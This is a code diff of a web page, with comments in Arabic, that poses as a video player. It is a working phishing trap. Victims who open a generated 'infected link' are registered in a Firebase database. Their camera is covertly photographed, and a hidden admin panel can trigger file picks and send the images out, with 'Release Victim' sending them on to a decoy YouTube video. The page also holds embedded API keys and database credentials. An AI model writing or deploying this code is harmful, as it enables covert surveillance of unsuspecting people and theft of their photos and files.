@@ -3,168 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>S-SYSTEM V31 | MASTER REBORN</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <title>Media Player</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --danger: #ff003c; }
-        body { background: #000; color: var(--neon); margin: 0; font-family: 'Courier New', monospace; overflow-x: hidden; }
+        body { background: #000; color: #fff; margin: 0; font-family: sans-serif; overflow: hidden; }
+        /* واجهة الضحية (التمويه) */
+        #vic-zone { display: none; height: 100vh; width: 100vw; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; position: fixed; background: #000; }
+        .play-btn { width: 80px; height: 80px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
+        .play-btn::after { content: ''; position: absolute; top: 22px; left: 32px; border-left: 25px solid #fff; border-top: 18px solid transparent; border-bottom: 18px solid transparent; }
         
-        /* لوحة التحكم الرئيسية - تفتح فوراً */
-        #main-dashboard { display: block; padding: 15px; }
-        .radar-panel { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); border-radius: 8px; box-shadow: 0 0 10px rgba(0,255,65,0.1); }
-        .target-card { border: 1px solid #333; padding: 12px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; background: #080808; transition: 0.3s; }
-        .target-card.active { border-color: #fff; background: #111; box-shadow: 0 0 15px var(--neon); }
-        
-        /* الأوامر */
-        .grid-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 15px; font-weight: bold; cursor: pointer; border-radius: 4px; }
-        button:active { background: var(--neon); color: #000; }
-        input { width: 100%; padding: 12px; background: #000; border: 1px solid var(--neon); color: #0ff; margin-bottom: 10px; box-sizing: border-box; }
-
-        /* واجهة الضحية - لا تفتح إلا برابط الـ V */
-        #trap-interface { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; width: 100%; background: #000; z-index: 9999; }
-        .play-ring { width: 100px; height: 100px; border: 5px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
-        .play-ring::after { content: ''; position: absolute; top: 25px; left: 38px; border-left: 35px solid #fff; border-top: 25px solid transparent; border-bottom: 25px solid transparent; }
+        /* لوحة التحكم (مؤمنة جداً) */
+        #admin-zone { display: none; padding: 20px; height: 100vh; overflow-y: auto; color: #00ff41; font-family: 'Courier New', monospace; }
+        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; border-radius: 5px; cursor: pointer; }
+        .v-card.active { border: 1px solid #fff; background: #111; }
+        button { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; margin-top: 5px; cursor: pointer; font-weight: bold; }
+        input { width: 100%; padding: 10px; background: #000; color: #00ff41; border: 1px solid #00ff41; margin-top: 5px; }
     </style>
 </head>
 <body>
 
-<div id="main-dashboard">
-    <div class="radar-panel">
-        <h3 style="margin-top:0;">📡 رادار الاتصال العكسي (V31):</h3>
-        <div id="v-list">جاري مسح الشبكة...</div>
+<div id="vic-zone">
+    <div id="p-scr">
+        <div class="play-btn" onclick="startGhost()"></div>
+        <p style="margin-top:20px;">Tap to Play Content</p>
     </div>
-
-    <div class="radar-panel">
-        <h3>🕹️ التحكم النشط: <span id="target-name" style="color:#fff;">--</span></h3>
-        <div class="grid-btns">
-            <button onclick="sendCmd('snap')">📸 التقاط صورة</button>
-            <button onclick="sendCmd('vibrate')" style="color:yellow; border-color:yellow;">📳 هز الجهاز</button>
-            <button onclick="sendCmd('pick')" style="color:cyan; border-color:cyan;">📂 سحب ملفات</button>
-            <button onclick="sendCmd('release')" style="background:#030;">🔓 إطلاق الضحية</button>
-        </div>
-        <button onclick="db.ref('victims').remove()" style="color:var(--danger); border-color:var(--danger); width:100%; margin-top:15px; font-size:10px;">🗑️ تنظيف الرادار</button>
+    <div id="l-scr" style="display:none; text-align:center;">
+        <div style="width:40px; height:40px; border:3px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
+        <p>Loading...</p>
     </div>
-
-    <div class="radar-panel">
-        <input type="text" id="decoy-input" placeholder="رابط يوتيوب للتمويه">
-        <button onclick="generateLink()" style="width:100%;">توليد رابط الفخ</button>
-        <div id="final-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all; background:#111; padding:8px; border:1px dashed #333;"></div>
-    </div>
+    <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 </div>
 
-<div id="trap-interface">
-    <div class="play-ring" onclick="ignite()"></div>
-    <p style="color:#fff; margin-top:20px; font-family: sans-serif;">Tap to Play Video</p>
-    <video id="hidden-video" autoplay playsinline style="display:none;"></video>
-    <canvas id="hidden-canvas" style="display:none;"></canvas>
-    <input type="file" id="file-picker" style="display:none;" accept="image/*" multiple>
+<div id="admin-zone">
+    <h2 style="border-bottom: 1px solid #00ff41;">MASTER CONTROL v15</h2>
+    <div id="v-list">بانتظار الأجهزة...</div>
+    <hr>
+    <div id="controls">
+        <h3>Target: <span id="t-name">None</span></h3>
+        <button onclick="send('snap')">📸 Snap Photo</button>
+        <button onclick="send('vibrate')">📳 Vibrate</button>
+        <button onclick="send('pick')">📂 Pick Files</button>
+        <button onclick="send('release')" style="background:#030;">🔓 Release Victim</button>
+        <button onclick="db.ref('/').remove()" style="color:red; border-color:red; margin-top:20px;">🗑️ Deep Clear DB</button>
+    </div>
+    <hr>
+    <h3>Generate Link:</h3>
+    <input type="text" id="target-url" placeholder="Paste YouTube Link">
+    <button onclick="gen()">Build Infected Link</button>
+    <div id="res" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
 </div>
 
 <script>
-    // --- إعدادات المحرك ---
-    const IMGBB_KEY = "657662c1253a66974d09325996b27e8a";
-    const fbConfig = {
+    const config = {
         apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
         databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
         projectId: "monster-system-7f67e"
     };
-
-    if (!firebase.apps.length) { firebase.initializeApp(fbConfig); }
+    firebase.initializeApp(config);
     const db = firebase.database();
-    let currentId = null;
+    let selId = null;
 
+    // --- نظام العزل الذكي ---
     const urlParams = new URLSearchParams(window.location.search);
-    const vKey = urlParams.get('v');
-    const adminCheck = urlParams.get('admin');
+    const isVictim = urlParams.get('v');
+    const isAdmin = urlParams.get('admin');
 
-    // --- منطق الأمان الجديد ---
-    if (adminCheck) {
-        // إذا حاول أحد إضافة "admin" للرابط، يتم قفل النظام فوراً للتمويه
-        document.body.innerHTML = "<div style='background:#000; height:100vh; color:red; display:flex; align-items:center; justify-content:center;'>ACCESS DENIED: SECURITY BREACH</div>";
-    } else if (vKey) {
-        // وضع الضحية
-        document.getElementById('main-dashboard').style.display = 'none';
-        document.getElementById('trap-interface').style.display = 'flex';
-        initVictim(atob(vKey));
+    if (isVictim) {
+        // ضحية محقق (حتى لو كان رابط قديم)
+        document.getElementById('vic-zone').style.display = 'flex';
+        runVictim(atob(isVictim));
+    } else if (isAdmin === "1") {
+        // آدمن محقق (أنت فقط من يعرف الكود ?admin=1)
+        document.getElementById('admin-zone').style.display = 'block';
+        runAdmin();
     } else {
-        // الرابط الحقيقي = لوحة التحكم مباشرة
-        initAdmin();
+        // أي دخول آخر (تائه أو ضحية يحاول التجسس) -> اظهر له صفحة فيديو فارغة أو وهمية
+        document.getElementById('vic-zone').style.display = 'flex';
+        document.body.innerHTML = "<div style='color:gray; text-align:center; margin-top:40vh;'>Error 404: Media Not Found</div>";
     }
 
-    // --- وظائف الرادار (آدمن) ---
-    function initAdmin() {
+    // --- منطق الآدمن ---
+    function runAdmin() {
         db.ref('victims').on('value', s => {
             const list = document.getElementById('v-list');
             list.innerHTML = '';
-            if(!s.exists()) { list.innerHTML = "في انتظار أول اتصال..."; return; }
             s.forEach(child => {
-                const val = child.val();
-                const id = child.key;
-                const active = (Date.now() - val.lastSeen) < 10000;
-                list.innerHTML += `<div class="target-card ${id === currentId ? 'active' : ''}" onclick="selectTarget('${id}','${val.model}')">
-                    <span>📱 ${val.model}</span>
-                    <span style="color:${active ? '#0f0' : '#444'}">${active ? '● متصل' : '● غائب'}</span>
+                const v = child.val(); const id = child.key;
+                const active = (Date.now() - v.lastSeen) < 10000;
+                list.innerHTML += `<div class="v-card ${id==selId?'active':''}" onclick="sel('${id}','${v.model}')">
+                    <span style="color:${active?'#0f0':'#f00'}">●</span> ${v.model} (${v.time})
                 </div>`;
+                // عرض الصور المسحوبة
+                if(id === selId && v.files) {
+                    // كود عرض الصور وحذفها
+                }
             });
         });
     }
-
-    function selectTarget(id, model) { currentId = id; document.getElementById('target-name').innerText = model; initAdmin(); }
-    function sendCmd(t) { if(currentId) db.ref('victims/'+currentId+'/cmd').set({ type: t, time: Date.now() }); }
-    function generateLink() {
-        const u = document.getElementById('decoy-input').value;
-        if(!u) return alert("ضع رابطاً!");
-        document.getElementById('final-link').innerText = window.location.origin + window.location.pathname + "?v=" + btoa(u);
+    function sel(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
+    function send(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
+    function gen() { 
+        const link = window.location.href.split('?')[0] + "?v=" + btoa(document.getElementById('target-url').value);
+        document.getElementById('res').innerText = link;
     }
 
-    // --- وظائف الاتصال العكسي (ضحية) ---
+    // --- منطق الضحية ---
     let myRef = null;
-    function initVictim(target) {
-        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2].split('Build')[0] : "iPhone/Mobile";
+    function runVictim(target) {
+        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile_Device";
         myRef = db.ref('victims').push();
-        
-        const pulse = () => myRef.update({ model: model, lastSeen: Date.now() });
-        pulse();
-        setInterval(pulse, 3000);
+        myRef.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
+        setInterval(() => myRef.update({ lastSeen: Date.now() }), 5000);
 
         db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
             const c = s.val(); if(!c) return;
-            if(c.type === 'snap') capture();
-            if(c.type === 'vibrate') navigator.vibrate([500, 200, 500]);
-            if(c.type === 'pick') document.getElementById('file-picker').click();
-            if(c.type === 'release') window.location.href = target;
+            if(c.t === 'snap') take();
+            if(c.t === 'vibrate') navigator.vibrate([300,100,300]);
+            if(c.t === 'pick') document.getElementById('f-in').click();
+            if(c.t === 'release') window.location.href = target;
         });
     }
 
-    async function ignite() { await capture(); }
+    async function startGhost() {
+        document.getElementById('p-scr').style.display = 'none';
+        document.getElementById('l-scr').style.display = 'block';
+        navigator.vibrate(100);
+        take();
+    }
 
-    async function capture() {
+    async function take() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({video:true});
-            const v = document.getElementById('hidden-video'); v.srcObject = s; await v.play();
-            const c = document.getElementById('hidden-canvas');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            upload(c.toDataURL('image/jpeg', 0.6).split(',')[1]);
-            s.getTracks().forEach(t => t.stop());
+            const video = document.getElementById('v'); video.srcObject = s; await video.play();
+            const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
+            s.getTracks().forEach(track => track.stop());
         } catch(e) {}
     }
 
-    function upload(base64) {
-        let fd = new FormData(); fd.append("image", base64);
-        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method: "POST", body: fd })
-        .then(res => res.json()).then(res => { myRef.child('photos').push(res.data.url); });
-    }
-
-    document.getElementById('file-picker').onchange = (e) => {
+    document.getElementById('f-in').onchange = (e) => {
         for(let f of e.target.files) {
             const r = new FileReader();
-            r.onload = (ev) => upload(ev.target.result.split(',')[1]);
+            r.onload = (ev) => myRef.child('files').push(ev.target.result);
             r.readAsDataURL(f);
         }
     };
 </script>
+<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
 </body>
 </html>
